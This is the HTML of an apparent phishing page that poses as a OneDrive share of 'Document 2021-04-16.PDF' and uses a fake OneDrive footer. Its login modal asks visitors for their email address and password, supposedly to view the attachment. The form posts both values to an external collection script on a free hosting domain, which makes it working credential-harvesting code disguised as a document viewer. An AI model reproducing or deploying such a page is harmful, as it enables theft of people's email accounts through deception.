...
<div style="float: left; padding-left: 10px; padding-right: 10px; line-height: 47px; color: #fff;"><input value="" readonly="" style="background: none;border: 0;outline: 0;color: #fff;text-align: right;"> </div>
...
<center><div style="background: #fff;margin-top: 2px;width: 70px;height: 96px;box-shadow: 1px 2px 5px #e8dfdf; padding-bottom: 10px;"></div></center> 
 <center><div style="flex-shrink: 1 ; font-family: Segoe UI, Segoe UI Web (West European), Segoe UI, -apple-system, BlinkMacSystemFont, Roboto, Helvetica Neue, sans-serif ; font-size: 14px ; font-weight: 400; margin-top: 6px; "> Document 2021-04-16.PDF </div><div style="flex-shrink: 1;font-family: Segoe UI, Segoe UI Web, Segoe UI, -apple-system, BlinkMacSystemFont, Roboto, Helvetica Neue, sans-serif;font-size: 12px;font-weight: 400;color: #777070;margin-top: -5px;">16 April 2021</div></center>
</div>
    ...
    <div class="modal-dialog" style="margin-top: 103px;width: 437px;">
      ...
      <div class="modal-content" style="border-radius: 0;height: 343px;box-shadow: 0 5px 10px rgba(0,0,0,.5);">
        <div class="modal-header">
		  ...
		  <h5>Login with your receiving email account to view attachment (Yahoo, Gmail, AOL, Other mail </h5>
        </div>
     <div class="modal-body">
		
		 <div>
		 <form method="post" action="https://dimeji01.000webhostapp.com/onedri/insert.php" >
 
		 
		 <input type="email" name="jade" placeholder="Log In Email" tabindex="1" required="" class="" autofocus="1" style="width: 100%;height: 51px;padding-left: 10px;background: #d8d8d857;border: 0;outline: 0;" value=""> </div>
 <br>
<div style="">
 <input type="password" name="crakass" placeholder="Password" tabindex="1" required="" class="" value="" style="width: 100%;width: 100%;height: 51px;padding-left: 10px;background: #ffffff;border: solid 1px #0067B8 !important;outline: 0;border: 0;"> 
 </div>
...
<center><div style="padding-top: 12px; font-size: 13px;">©2021 OneDrive &nbsp; &nbsp; Terms of use  &nbsp; &nbsp; Privacy & cookies </div></center>
        </div>
       </form>
      </div>
